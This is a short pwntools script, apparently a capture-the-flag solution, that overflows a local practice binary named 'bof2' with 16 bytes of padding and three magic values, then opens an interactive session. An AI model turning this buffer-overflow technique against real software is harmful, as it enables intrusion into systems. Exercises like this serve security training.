from pwn import *

r = process("./bof2")

v5 = 0xcafebabe
v6 = 0xdeadbeef
v7 = 0x13371337
payload = b'a'*16 + p64(v5) + p64(v6) + p64(v7)
r.sendline(payload)
r.interactive()